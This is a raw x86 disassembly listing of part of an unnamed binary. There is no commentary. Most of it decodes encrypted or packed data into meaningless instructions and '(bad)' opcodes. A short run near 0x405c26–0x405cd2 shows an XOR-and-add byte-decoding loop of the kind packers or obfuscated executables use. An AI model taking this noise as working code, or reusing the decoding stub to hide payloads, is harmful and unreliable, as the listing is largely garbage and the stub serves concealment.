  405776:	mov    ch,0x87
  405778:	jecxz  0x4057de
  40577a:	adc    eax,0xbed968a8
  40577f:	add    al,0xc7
  405781:	aam    0x64
  405783:	(bad)  
  405784:	stc    
  405785:	scas   al,BYTE PTR es:[edi]
  405786:	mov    esp,0x48d87f1d
  40578b:	jae    0x4057b8
  40578d:	or     BYTE PTR [ecx-0x75e6e2c0],bl
  405793:	loope  0x40578f
  405795:	(bad)  
  405796:	es out 0xf1,eax
  405799:	dec    ecx
  40579a:	imul   ebp,esi,0xcb01a525
  4057a0:	dec    ecx
  4057a1:	sub    al,0xc5
  4057a3:	inc    ecx
  4057a4:	cmp    dl,BYTE PTR [edi-0x30eaa140]
  4057aa:	push   esp
  4057ab:	mov    cl,0xc0
  4057ad:	fdiv   QWORD PTR ds:0x42b4c5b7
  4057b3:	test   BYTE PTR [ecx],cl
  4057b5:	rcr    DWORD PTR [ebp-0x6ab9af24],cl
  4057bb:	pushf  
  4057bc:	les    edx,FWORD PTR [ebp+ebp*4+0x65]
  4057c0:	mov    eax,ds:0x416a139a
  4057c5:	jno    0x4057a0
  4057c7:	jno    0x4057b9
  4057c9:	and    ah,bh
  4057cb:	call   0x7050c2ba
  4057d0:	sahf   
  4057d1:	xacquire xchg DWORD PTR [ebp-0x28],esp
  4057d5:	cmp    al,BYTE PTR [edx]
  4057d7:	cwde   
  4057d8:	sub    edi,DWORD PTR [edi-0x4b]
  4057db:	lahf   
  4057dc:	call   0x34ec99d1
  4057e1:	arpl   WORD PTR ds:0x20efabf1,bx
  4057e7:	fwait
  4057e8:	or     BYTE PTR [ebx],0x74
  4057eb:	sub    esi,DWORD PTR [ecx+0x760e2da1]
  4057f1:	pop    esp
  4057f2:	and    eax,0x211d0da8
  4057f7:	pop    es
  4057f8:	sub    BYTE PTR ds:0xdf89e064,dl
  4057fe:	and    BYTE PTR ds:0x43ed7c35,ah
  405804:	ret    
  405805:	(bad)  
  405806:	xor    DWORD PTR [edi-0x779dff5c],0x9e16a2fe
  405810:	dec    eax
  405811:	xor    DWORD PTR [ebp+0x48],0x32
  405815:	rcl    DWORD PTR [edx-0x3f],1
  405818:	sub    BYTE PTR [edi],cl
  40581a:	lea    esp,[ebp+0x6a3cb373]
  405820:	rol    BYTE PTR ds:0x518b1a8d,cl
  405826:	mov    dh,0xfb
  405828:	xchg   ebx,eax
  405829:	push   ecx
  40582a:	mov    ds:0x6397530f,al
  40582f:	fwait
  405830:	pop    esp
  405831:	inc    ebx
  405832:	icebp  
  405833:	adc    eax,0x18388aca
  405838:	mov    dh,0x20
  40583a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40583b:	pop    ecx
  40583c:	and    eax,0x72c079ef
  405841:	push   ebx
  405842:	jmp    0xa895ead4
  405847:	xchg   esp,eax
  405848:	and    eax,0xc2a627b
  40584d:	shl    DWORD PTR ds:0x6c63803c,cl
  405853:	int3   
  405854:	push   0xabcc1e46
  405859:	hlt    
  40585a:	daa    
  40585b:	pop    ebp
  40585c:	and    al,ah
  40585e:	xor    cl,dh
  405860:	jbe    0x40588e
  405862:	test   al,0x28
  405864:	call   0xc1ca5ac
  405869:	out    0xfe,al
  40586b:	dec    eax
  40586c:	test   BYTE PTR [ebx-0x4a],ah
  40586f:	pushf  
  405870:	and    ecx,DWORD PTR [edx+0x7d15c59a]
  405876:	mov    dh,0xfb
  405878:	outs   dx,DWORD PTR gs:[esi]
  40587a:	mov    cl,0xf0
  40587c:	icebp  
  40587d:	lods   eax,DWORD PTR gs:[esi]
  40587f:	jns    0x4058df
  405881:	fldenv [esi+0x54]
  405884:	test   bl,ch
  405886:	or     BYTE PTR [edx],al
  405888:	xor    eax,0x37922f7f
  40588d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40588e:	pop    ds
  40588f:	xchg   esp,eax
  405890:	push   ds
  405891:	or     bl,BYTE PTR [ebp+0x74]
  405894:	lods   al,BYTE PTR ds:[esi]
  405895:	sub    ah,0x1a
  405898:	out    0x36,eax
  40589a:	fldenv [edx+0x3a054757]
  4058a0:	jp     0x4058d6
  4058a2:	test   DWORD PTR [esi+0x13cb0503],eax
  4058a8:	imul   esi,DWORD PTR [ebp-0x6],0xffffffc3
  4058ac:	jbe    0x4058e2
  4058ae:	sti    
  4058af:	lds    eax,FWORD PTR [edi+0x67]
  4058b2:	aaa    
  4058b3:	adc    BYTE PTR [edi],dl
  4058b5:	outs   dx,BYTE PTR ds:[esi]
  4058b6:	cmp    DWORD PTR [eax],esp
  4058b8:	stc    
  4058b9:	shr    BYTE PTR [ebx],0x8e
  4058bc:	stos   DWORD PTR es:[edi],eax
  4058bd:	loop   0x405847
  4058bf:	aam    0x23
  4058c1:	or     ecx,DWORD PTR [edi-0x1a]
  4058c4:	inc    eax
  4058c5:	div    BYTE PTR [edi-0x21]
  4058c8:	sub    esp,DWORD PTR [edi+eax*4-0x6662ebb]
  4058cf:	outs   dx,DWORD PTR ds:[esi]
  4058d0:	jmp    0x4058f6
  4058d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4058d3:	add    BYTE PTR [bp+si-0x14],0xb0
  4058d8:	jle    0x405907
  4058da:	(bad)  [edi-0x1e]
  4058dd:	inc    edi
  4058de:	or     edx,ebp
  4058e0:	pop    eax
  4058e1:	into   
  4058e2:	xchg   esp,eax
  4058e3:	ds call 0xb0b00d31
  4058e9:	popf   
  4058ea:	jmp    0xb79a:0x2e70a92c
  4058f1:	pop    ds
  4058f2:	and    al,0xd5
  4058f4:	dec    edi
  4058f5:	aas    
  4058f6:	dec    eax
  4058f7:	cmp    al,0xed
  4058f9:	push   eax
  4058fa:	mov    esp,0x25f8ac3e
  4058ff:	cwde   
  405900:	std    
  405901:	or     ebp,ecx
  405903:	add    DWORD PTR [ebp-0x12],edx
  405906:	add    eax,0x9b230fc4
  40590b:	pop    ebp
  40590c:	pop    esi
  40590d:	int3   
  40590e:	jg     0x405944
  405910:	push   0xffffff8f
  405912:	xor    al,0xfb
  405914:	test   al,0x5
  405916:	mov    ebx,0xaa648552
  40591b:	xor    DWORD PTR [ebp+0xa8d9481],ebx
  405921:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405922:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405924:	fnstcw WORD PTR [ebx]
  405926:	stos   DWORD PTR es:[edi],eax
  405927:	not    eax
  405929:	inc    edx
  40592a:	sbb    eax,0x377c348e
  40592f:	sbb    DWORD PTR [ecx],edi
  405931:	jp     0x405912
  405933:	jb     0x4058c0
  405935:	cmc    
  405936:	xchg   esi,eax
  405937:	(bad)  [eax]
  405939:	mov    ch,0xd4
  40593b:	or     eax,DWORD PTR [ecx]
  40593d:	mov    eax,ds:0x30292258
  405942:	shl    BYTE PTR [eax+0x4b],cl
  405945:	and    dl,BYTE PTR [eax+edi*1+0x747d407d]
  40594c:	aad    0x20
  40594e:	out    0x4b,al
  405950:	push   esp
  405951:	aas    
  405952:	xor    edi,DWORD PTR [ecx+0x4e]
  405955:	pusha  
  405956:	test   cl,dh
  405958:	pop    es
  405959:	lds    edi,FWORD PTR [esi-0x1e]
  40595c:	cmc    
  40595d:	sti    
  40595e:	pop    ebp
  40595f:	icebp  
  405960:	jno    0x4059c4
  405962:	xor    esi,DWORD PTR [ecx+0x32674049]
  405968:	fcom   st(5)
  40596a:	sub    ebx,ebx
  40596c:	push   esp
  40596d:	xor    eax,0xc2edbf8c
  405972:	sti    
  405973:	inc    ecx
  405974:	outs   dx,DWORD PTR ds:[esi]
  405975:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405976:	out    dx,al
  405977:	(bad)  
  405978:	inc    ebx
  405979:	aad    0xed
  40597b:	mov    ax,0xd20d
  40597f:	jmp    0x86f0041a
  405984:	mov    dl,0x83
  405986:	push   ss
  405987:	mov    esp,0xed394551
  40598c:	fisttp WORD PTR [ecx-0x59]
  40598f:	sub    DWORD PTR [ebx+0x70],ecx
  405992:	mov    ebx,0x4983f343
  405997:	loop   0x40596e
  405999:	lds    edx,FWORD PTR [edx]
  40599b:	inc    edi
  40599c:	retf   0xec5
  40599f:	jo     0x40595b
  4059a1:	retf   
  4059a2:	pop    esi
  4059a3:	fild   DWORD PTR [ebp-0x4]
  4059a6:	scas   al,BYTE PTR es:[edi]
  4059a7:	cwde   
  4059a8:	sub    dh,BYTE PTR [ebx+0x66]
  4059ab:	cmp    al,0xc8
  4059ad:	and    esi,DWORD PTR [ebx+0x3]
  4059b0:	pop    eax
  4059b1:	sbb    BYTE PTR [ecx+0x5b67bd55],dl
  4059b7:	mov    ch,0xc5
  4059b9:	mov    eax,0x6c36388d
  4059be:	mov    dh,0xc9
  4059c0:	mov    ebp,0xa624aed5
  4059c5:	daa    
  4059c6:	daa    
  4059c7:	add    ebp,DWORD PTR [ebx-0x26]
  4059ca:	and    eax,0x80ab6269
  4059cf:	stc    
  4059d0:	dec    eax
  4059d1:	sub    bl,BYTE PTR [esi+0xd]
  4059d4:	(bad)  
  4059d5:	sar    cl,1
  4059d7:	dec    ecx
  4059d8:	xor    dh,ch
  4059da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4059db:	cmp    ch,BYTE PTR es:[ebp-0x35ddc338]
  4059e2:	mov    ecx,0x6a3a2a34
  4059e7:	pop    edx
  4059e8:	pop    ecx
  4059e9:	fistp  DWORD PTR [ecx-0x35]
  4059ec:	mov    esp,0x9b4b185
  4059f1:	mov    al,0x45
  4059f3:	loopne 0x405a5b
  4059f5:	icebp  
  4059f6:	pop    esp
  4059f7:	outs   dx,DWORD PTR ds:[esi]
  4059f8:	xchg   BYTE PTR [edi],al
  4059fa:	push   edi
  4059fb:	and    bh,BYTE PTR [esp+ebx*2+0x49]
  4059ff:	aas    
  405a00:	pop    edi
  405a01:	lea    edi,cs:[ebx]
  405a04:	cmp    al,0xe0
  405a06:	pop    eax
  405a07:	mov    eax,0xce7a3f7
  405a0c:	jg     0x40598f
  405a0e:	push   esp
  405a0f:	repnz push edi
  405a11:	fs xchg dh,bh
  405a14:	add    esi,DWORD PTR [esi-0x2deb9127]
  405a1a:	sbb    BYTE PTR [eax+0x10fc0c09],0xc6
  405a21:	mov    al,ds:0x8ab96de2
  405a26:	jl     0x405a08
  405a28:	jb     0x405a52
  405a2a:	mov    edi,0xd82260c2
  405a2f:	push   ecx
  405a30:	or     DWORD PTR [esi-0x3c887f22],0xfffffffa
  405a37:	test   BYTE PTR [eax],cl
  405a39:	inc    esi
  405a3a:	int3   
  405a3b:	pusha  
  405a3c:	add    BYTE PTR [ecx],0xdc
  405a3f:	pop    es
  405a40:	in     al,dx
  405a41:	mov    ds:0x39594036,al
  405a46:	mov    bh,0x69
  405a48:	pop    ebp
  405a49:	jb     0x405a7f
  405a4b:	jae    0x405a55
  405a4d:	rcr    DWORD PTR [edx+0x3a],0x3e
  405a51:	mov    cl,0xc7
  405a53:	xor    DWORD PTR [edx+edx*2+0x3d],0xffffff93
  405a58:	add    bl,ch
  405a5a:	shl    DWORD PTR [esi],0xfd
  405a5d:	fstp   DWORD PTR [ecx+0xcefa630]
  405a63:	cmc    
  405a64:	mov    ch,0x8b
  405a66:	or     eax,DWORD PTR [edx-0x21254f6]
  405a6c:	dec    esp
  405a6d:	xor    al,0x97
  405a6f:	fisub  DWORD PTR [ecx-0x4e747e55]
  405a75:	cmp    al,0x9c
  405a77:	adc    BYTE PTR [ecx],al
  405a79:	xchg   esi,eax
  405a7a:	mov    al,0x4b
  405a7c:	xchg   esp,edx
  405a7e:	(bad)  
  405a80:	repnz xor eax,0xf1e138f8
  405a86:	jmp    0xe6a79a4f
  405a8b:	jb     0x405ae3
  405a8d:	mov    esi,DWORD PTR [ebp+0x1186db35]
  405a93:	xchg   ebx,eax
  405a94:	xchg   ebp,eax
  405a95:	aas    
  405a96:	mov    ecx,0x678269f4
  405a9b:	daa    
  405a9c:	add    eax,0xf234b765
  405aa1:	addr16 jnp 0x405a6e
  405aa4:	gs movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405aa7:	sbb    ch,bh
  405aa9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405aaa:	adc    esi,DWORD PTR [eax+0x6fcea897]
  405ab0:	sbb    ah,BYTE PTR [eax-0x6ea9a06a]
  405ab6:	adc    al,0xe9
  405ab8:	in     al,dx
  405ab9:	mov    ah,0x98
  405abb:	dec    edi
  405abc:	xor    eax,0xd578adc7
  405ac1:	xor    eax,0xb96cc207
  405ac6:	mov    DWORD PTR [ebx+0x4e80eeb7],ebp
  405acc:	stos   BYTE PTR es:[edi],al
  405acd:	aam    0xd2
  405acf:	and    al,cl
  405ad1:	add    eax,0xa396f887
  405ad6:	cld    
  405ad7:	in     al,dx
  405ad8:	jae    0x405adc
  405ada:	xor    ebp,DWORD PTR [ebp+0x3]
  405add:	pop    ebp
  405ade:	test   DWORD PTR [ecx],ebp
  405ae0:	enter  0xc46,0xb9
  405ae4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ae5:	push   edi
  405ae6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ae7:	popf   
  405ae8:	sbb    al,0x2a
  405aea:	loope  0x405b4e
  405aec:	fadd   DWORD PTR [edx+0x36]
  405aef:	aas    
  405af0:	add    DWORD PTR [esi+0x1e],esp
  405af3:	aam    0xee
  405af5:	jle    0x405ace
  405af7:	stc    
  405af8:	inc    esp
  405af9:	inc    esp
  405afa:	mov    dh,0x64
  405afc:	(bad)  
  405afd:	pop    ds
  405afe:	pop    eax
  405aff:	shl    BYTE PTR [edi],1
  405b01:	imul   ebp,edi,0xbd7d0b3b
  405b07:	cli    
  405b08:	add    dh,bl
  405b0a:	(bad)  
  405b0b:	mov    edi,0xeb3b8721
  405b10:	mov    dl,0x48
  405b12:	jno    0x405aa5
  405b14:	jecxz  0x405b49
  405b16:	sub    eax,0x98fd47d9
  405b1b:	call   DWORD PTR [ebp-0x4b]
  405b1e:	push   ebp
  405b1f:	push   ebp
  405b20:	push   ss
  405b21:	je     0x405b59
  405b23:	fisttp DWORD PTR [esi+0x1307725b]
  405b29:	in     eax,dx
  405b2a:	push   0x5c
  405b2c:	xor    eax,DWORD PTR [ebp-0x707d60b5]
  405b32:	ja     0x405b09
  405b34:	pop    esi
  405b35:	nop
  405b36:	pusha  
  405b37:	loopne 0x405adc
  405b39:	es inc eax
  405b3b:	xchg   esp,eax
  405b3c:	aas    
  405b3d:	pop    ss
  405b3e:	sub    BYTE PTR [edi],0x4d
  405b41:	(bad)  
  405b42:	fsubr  QWORD PTR [edx+0x8d74c50]
  405b48:	test   esp,esi
  405b4a:	mov    BYTE PTR [esp+edx*8+0x57fdb50e],0xff
  405b52:	fyl2xp1 
  405b54:	sub    al,0xde
  405b56:	xor    bl,BYTE PTR [ebx+ebp*1+0xe]
  405b5a:	data16 or al,0x89
  405b5d:	in     al,dx
  405b5e:	imul   esi,DWORD PTR cs:[ebp-0x7a],0x73d59d64
  405b66:	sbb    ah,cl
  405b68:	rol    edx,cl
  405b6a:	pop    edi
  405b6b:	mov    ah,0x1b
  405b6d:	and    al,0x4c
  405b6f:	mov    esi,0xd4cb7a49
  405b74:	ss cdq 
  405b76:	es arpl dx,cx
  405b79:	mov    bl,0x91
  405b7b:	adc    al,0xde
  405b7d:	add    BYTE PTR [eax],0x77
  405b80:	fstp   QWORD PTR [ecx+0x37]
  405b83:	mov    cl,0x56
  405b85:	shl    DWORD PTR [edi+0x6f030418],0x44
  405b8c:	and    ebp,eax
  405b8e:	jge    0x405b78
  405b90:	and    BYTE PTR [edi+0x67],cl
  405b93:	or     dl,BYTE PTR [ecx+0x416bb1c0]
  405b99:	add    DWORD PTR ds:0x900a7657,ecx
  405b9f:	add    ch,BYTE PTR [eax-0x79]
  405ba2:	dec    edi
  405ba3:	pop    esp
  405ba4:	sub    al,0x7c
  405ba6:	leave  
  405ba7:	shl    ah,1
  405ba9:	ret    
  405baa:	adc    BYTE PTR [edi+0x3e],dl
  405bad:	mov    dh,BYTE PTR [esi+0x72]
  405bb0:	gs push cs
  405bb2:	cld    
  405bb3:	arpl   WORD PTR [ebx+ebp*2],bp
  405bb6:	jecxz  0x405be2
  405bb8:	aaa    
  405bb9:	cmp    BYTE PTR [ecx],ch
  405bbb:	fiadd  DWORD PTR [ecx-0x3c]
  405bbe:	jp     0x405c34
  405bc0:	pop    esp
  405bc1:	sub    DWORD PTR [eax+0x7b],ebx
  405bc4:	lods   eax,DWORD PTR ds:[esi]
  405bc5:	stos   DWORD PTR es:[edi],eax
  405bc6:	sbb    BYTE PTR [esi+0x5f49cc83],ch
  405bcc:	adc    eax,DWORD PTR [esi]
  405bce:	mov    DWORD PTR [ebx-0xb24cabb],0xf5173dd
  405bd8:	sbb    eax,0xec4c4eed
  405bdd:	xchg   edi,eax
  405bde:	jne    0x405b81
  405be0:	or     DWORD PTR [edi],0x2efd6e98
  405be6:	mov    BYTE PTR [ecx-0x5a],bl
  405be9:	mov    edi,0x233bd1a2
  405bee:	inc    edx
  405bef:	js     0x405bb9
  405bf1:	sub    al,0x59
  405bf3:	sub    DWORD PTR ds:0xaf71ad6c,ebx
  405bf9:	push   0x65
  405bfb:	mov    ebx,0xf3ca7c3f
  405c00:	push   ebx
  405c01:	es adc al,0x2a
  405c04:	mov    bh,0x14
  405c06:	into   
  405c07:	inc    esi
  405c08:	pop    ebx
  405c09:	popf   
  405c0a:	push   esi
  405c0b:	push   ebp
  405c0c:	(bad)  
  405c0d:	cdq    
  405c0e:	sub    eax,0x6ae4e340
  405c13:	inc    edx
  405c14:	xor    al,0xa
  405c16:	inc    esp
  405c17:	scas   al,BYTE PTR es:[edi]
  405c18:	or     eax,0x2b72c9d4
  405c1d:	ret    
  405c1e:	cmp    edx,eax
  405c20:	jne    0x405caa
  405c26:	mov    eax,DWORD PTR [ebp-0xc]
  405c29:	mov    dl,BYTE PTR [eax+ecx*1+0x801]
  405c30:	mov    eax,DWORD PTR [ebp-0x20]
  405c33:	mov    ebx,DWORD PTR [ebp-0x18]
  405c36:	xor    eax,esi
  405c38:	xor    ebx,esi
  405c3a:	add    eax,edi
  405c3c:	add    ebx,edi
  405c3e:	mov    BYTE PTR [ebp-0x1],dl
  405c41:	cmp    eax,ebx
  405c43:	jae    0x405c98
  405c49:	lea    edx,[eax-0x3272ec]
  405c4f:	mov    DWORD PTR [ebp-0x14],edx
  405c52:	mov    ebx,DWORD PTR [ebp-0x14]
  405c55:	xor    ebx,esi
  405c57:	add    ebx,0x7f55d8f2
  405c5d:	lea    edx,[ebp+eax*4-0x3c]
  405c61:	mov    DWORD PTR [edx],ebx
  405c63:	mov    ebx,DWORD PTR [edx]
  405c65:	cmp    ebx,0x244ecb93
  405c6b:	jbe    0x405c7c
  405c71:	add    DWORD PTR [edx],0x405fcdc
  405c77:	jmp    0x405c82
  405c7c:	add    DWORD PTR [edx],0xfdaf4324
  405c82:	mov    edx,DWORD PTR [ebp-0x18]
  405c85:	xor    edx,esi
  405c87:	inc    eax
  405c88:	inc    DWORD PTR [ebp-0x14]
  405c8b:	add    edx,edi
  405c8d:	cmp    eax,edx
  405c8f:	jb     0x405c52
  405c95:	mov    dl,BYTE PTR [ebp-0x1]
  405c98:	xor    dl,0x79
  405c9b:	sub    dl,0x3
  405c9e:	xor    eax,eax
  405ca0:	mov    eax,DWORD PTR [ebp-0xc]
  405ca3:	mov    BYTE PTR [eax+ecx*1+0x801],dl
  405caa:	mov    eax,DWORD PTR [ebp-0xc]
  405cad:	mov    edx,DWORD PTR [ebp-0x20]
  405cb0:	sub    eax,edi
  405cb2:	xor    eax,esi
  405cb4:	cmp    eax,edx
  405cb6:	jne    0x40809e
  405cbc:	mov    eax,DWORD PTR [ebp-0x10]
  405cbf:	mov    edx,DWORD PTR [ebp-0x8]
  405cc2:	xor    eax,esi
  405cc4:	xor    edx,esi
  405cc6:	sub    eax,edx
  405cc8:	sub    eax,edi
  405cca:	xor    eax,esi
  405ccc:	mov    DWORD PTR [ebp-0x10],eax
  405ccf:	mov    eax,DWORD PTR [ebp-0x8]
  405cd2:	jmp    0x408090
  405cd7:	mov    eax,ds:0x7b519088
  405cdc:	dec    ecx
  405cdd:	mov    ds:0xeab98a78,eax
  405ce2:	ficom  WORD PTR [ecx+0x3c1e7174]
  405ce8:	xor    edi,DWORD PTR [edx+0x7a]
  405ceb:	fstp   QWORD PTR [edi+0x7a]
  405cee:	jp     0x405cdd
  405cf0:	and    bl,BYTE PTR [esi+0x5e]
  405cf3:	xchg   ebx,eax
  405cf4:	jp     0x405ca1
  405cf6:	jne    0x405cf2
  405cf8:	jge    0x405d02
  405cfa:	jne    0x405d6d
  405cfc:	je     0x405cbc
  405cfe:	mov    eax,0xe0843769
  405d03:	in     eax,0xb8
  405d05:	adc    al,0xda
  405d07:	inc    ecx
  405d08:	bound  ebx,QWORD PTR [edi]
  405d0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d0b:	adc    al,0x4d
  405d0d:	push   esp
  405d0e:	dec    esi
  405d0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d10:	adc    DWORD PTR [edx+0x6a],esi
  405d13:	ja     0x405d59
  405d15:	sub    DWORD PTR [ebp+0x72],0xffffffb3
  405d19:	(bad)  
  405d1a:	cmc    
  405d1b:	xor    eax,DWORD PTR [ebp-0x2f2d4faf]
  405d21:	pop    ss
  405d22:	je     0x405d66
  405d24:	test   BYTE PTR [ecx-0x71fa9a51],al
  405d2a:	lods   al,BYTE PTR ds:[esi]
  405d2b:	pusha  
  405d2c:	jno    0x405cf7
  405d2e:	call   0xf8af:0x8640280d
  405d35:	push   0xb5f02a99
  405d3a:	push   ebx
  405d3b:	std    
  405d3c:	and    DWORD PTR ds:0x93a210d4,0xcb1614b1
  405d46:	clc    
  405d47:	adc    DWORD PTR [edi],0x42
  405d4a:	ret    
  405d4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d4c:	lods   eax,DWORD PTR ds:[esi]
  405d4d:	jo     0x405dba
  405d4f:	fidiv  DWORD PTR [edx-0x55aba203]
  405d55:	dec    ebp
  405d56:	ja     0x405ce9
  405d58:	dec    ecx
  405d59:	(bad)  
  405d5b:	sbb    ah,bh
  405d5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d5e:	and    esi,edi
  405d60:	xor    esp,DWORD PTR [edi-0x16]
  405d63:	loope  0x405cfe
  405d65:	jno    0x405d0e
  405d67:	pop    edx
  405d68:	jg     0x405d30
  405d6a:	push   edi
  405d6b:	enter  0xbf28,0x81
  405d6f:	sub    eax,0x83618e08
  405d74:	mov    ebp,0x5a3f83f1
  405d79:	pop    ss
  405d7a:	xchg   edi,eax
  405d7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d7c:	pop    es
  405d7d:	mov    ds:0xa0bed65e,eax
  405d82:	test   al,0x53
  405d84:	inc    edi
  405d85:	stos   BYTE PTR es:[edi],al
  405d86:	and    BYTE PTR [esi+0x32],ah
  405d89:	aaa    
  405d8a:	pop    ecx
  405d8b:	jg     0x405dc1
  405d8d:	xchg   esi,eax
  405d8e:	(bad)  
  405d8f:	adc    edi,edi
  405d91:	call   0x6808:0x9edb18ba
  405d98:	stos   DWORD PTR es:[edi],eax
  405d99:	ins    BYTE PTR es:[edi],dx
  405d9a:	push   es
  405d9b:	cmp    esi,ebp
  405d9d:	fs int 0xa9
  405da0:	imul   esp,DWORD PTR [edx],0x35ad386a
  405da6:	mov    edi,0x2b444c17
  405dab:	outs   dx,BYTE PTR ds:[esi]
  405dac:	test   BYTE PTR [edx*8-0x2398d828],bh
  405db3:	jp     0x405d61
  405db5:	bound  ecx,QWORD PTR [edi-0x10]
  405db8:	shl    DWORD PTR [esi],1
  405dba:	sbb    edx,DWORD PTR [esi]
  405dbc:	mov    eax,0x9ba91a9d
  405dc1:	inc    eax
  405dc2:	cmp    ebx,DWORD PTR [eax+0x5d2ea875]
  405dc8:	or     al,0x8
  405dca:	ins    DWORD PTR es:[edi],dx
  405dcb:	mov    BYTE PTR [ecx-0x5df2305],cl
  405dd1:	popa   
  405dd2:	push   es
  405dd3:	and    al,0x58
  405dd5:	call   0x2260:0x57284616
  405ddc:	or     DWORD PTR [esi],esi
  405dde:	ds jae 0x405e3f
  405de1:	cmp    al,0x36
  405de3:	inc    ecx
  405de4:	data16 in al,0xdf
  405de7:	les    ebp,FWORD PTR [ebx+0x6e]
  405dea:	jmp    0x405e25
  405dec:	inc    ebp
  405ded:	xchg   esi,eax
  405dee:	lods   al,BYTE PTR ds:[esi]
  405def:	sbb    DWORD PTR [edi+0x11],esp
  405df2:	cmp    BYTE PTR [ebp*8+0x5df5a919],ah
  405df9:	(bad)  [eax-0x2f]
  405dfc:	shl    DWORD PTR [eax+0x59],cl
  405dff:	add    BYTE PTR [eax-0x4653a7ed],0x28
  405e06:	in     al,0x3d
  405e08:	shl    esi,cl
  405e0a:	sub    al,0x53
  405e0c:	add    BYTE PTR [edx+0x67],al
  405e0f:	(bad)
  405e13:	sahf   
  405e14:	jae    0x405dfc
  405e16:	mov    al,0xf7
  405e18:	ror    eax,1
  405e1a:	call   0xdbc4:0xfaa43a5b
  405e21:	gs xchg esp,eax
  405e23:	cli    
  405e24:	sub    BYTE PTR [esi+0x24d6c8e2],dh
  405e2a:	(bad)  
  405e2b:	popa   
  405e2c:	daa    
  405e2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e2e:	adc    dl,bh
  405e30:	mov    WORD PTR [ecx+0x3c],?
  405e33:	into   
  405e34:	dec    esp
  405e35:	call   0x5d8f7e6a
  405e3a:	lock push 0xffffff93
  405e3d:	cwde   
  405e3e:	or     eax,0x5d16e0fb
  405e43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e44:	aad    0xa2
  405e46:	sbb    eax,0x22202ff7
  405e4b:	mov    eax,DWORD PTR [eax+0x27]
  405e4e:	sub    BYTE PTR [eax+esi*4+0x7e],0x0
  405e53:	mov    WORD PTR [edx],gs
  405e55:	xor    al,0x25
  405e57:	dec    ebp
  405e58:	and    eax,0x8c4617d
  405e5d:	loope  0x405de5
  405e5f:	int3   
  405e60:	pop    es
  405e61:	lea    eax,[edi+0x18e89d8e]
  405e67:	sbb    al,0xf1
  405e69:	fldcw  WORD PTR [esi-0x42e4daf4]
  405e6f:	enter  0xe4e7,0x4b
  405e73:	sbb    esi,DWORD PTR [edx+0x117294d5]
  405e79:	or     ch,BYTE PTR [esp+eiz*8]
  405e7c:	inc    ebx
  405e7d:	cmp    al,0x97
  405e7f:	ja     0x405ea7
  405e81:	repnz in al,0x93
  405e84:	mov    edi,0x43aae630
  405e89:	inc    edx
  405e8a:	xchg   esp,eax
  405e8b:	lods   al,BYTE PTR ds:[esi]
  405e8c:	xor    esp,DWORD PTR [eax-0x213201dc]
  405e92:	add    al,BYTE PTR [ebp-0xc]
  405e95:	and    ebx,DWORD PTR ds:0xd8fd39e3
  405e9b:	add    al,0x42
  405e9d:	pop    ds
  405e9e:	gs jnp 0x405e8b
  405ea1:	ficomp DWORD PTR [edx]
  405ea3:	dec    ecx
  405ea4:	daa    
  405ea5:	jl     0x405e5e
  405ea7:	dec    DWORD PTR [edi-0x1c7a8ab]
  405ead:	dec    ebx
  405eae:	les    edx,FWORD PTR [edi-0x28e20375]
  405eb4:	fidiv  DWORD PTR [esi]
  405eb6:	xor    edx,DWORD PTR [edi+0x3d]
  405eb9:	fdiv   QWORD PTR [edi-0x5b74276a]
  405ebf:	ins    DWORD PTR es:[edi],dx
  405ec0:	dec    esp
  405ec1:	mov    eax,0xfc129ada
  405ec6:	fbld   TBYTE PTR [edi-0x54]
  405ec9:	push   eax
  405eca:	int    0xb1
  405ecc:	xor    ecx,DWORD PTR [ebp+0xcd59316]
  405ed2:	inc    esi
  405ed3:	pop    esp
  405ed4:	repz data16 mov bh,0x0
  405ed8:	dec    esp
  405ed9:	pop    esp
  405eda:	push   0x3e
  405edc:	scas   al,BYTE PTR es:[edi]
  405edd:	sub    DWORD PTR [edi+0x1b],0xf7afb079
  405ee4:	inc    edx
  405ee5:	popa   
  405ee6:	dec    ebp
  405ee7:	xchg   esp,eax
  405ee8:	and    al,0x9b
  405eea:	(bad)  
  405eec:	sbb    dh,BYTE PTR [eax]
  405eee:	enter  0x78c0,0xe4
  405ef2:	jl     0x405f0b
  405ef4:	loop   0x405f29
  405ef6:	sub    ah,BYTE PTR [ebx-0x6e3dc762]
  405efc:	dec    esp
  405efd:	repz sub esi,edx
  405f00:	mov    ecx,0x59686d00
  405f05:	mov    DWORD PTR [edi+0x6d],eax
  405f08:	ret    
  405f09:	or     DWORD PTR [edx],0x72
  405f0c:	ss dec eax
  405f0e:	xchg   ebp,eax
  405f0f:	lea    esi,[ebx-0x160cc00f]
  405f15:	push   ecx
  405f16:	push   ebx
  405f17:	ins    DWORD PTR es:[edi],dx
  405f18:	mov    ds:0x420fa54f,eax
  405f1d:	jp     0x405f7c
  405f1f:	repz mov cl,0xfc
  405f22:	retf   
  405f23:	push   eax
  405f24:	inc    ebp
  405f25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f26:	repz repnz (bad) 
  405f29:	dec    ebx
  405f2a:	dec    edi
  405f2b:	in     al,0xf6
  405f2d:	cdq    
  405f2e:	les    esi,FWORD PTR [edx]
  405f30:	and    BYTE PTR [edi],dh
  405f32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f33:	pop    edx
  405f34:	aam    0x70
  405f36:	inc    bl
  405f38:	or     ch,bl
  405f3a:	push   esi
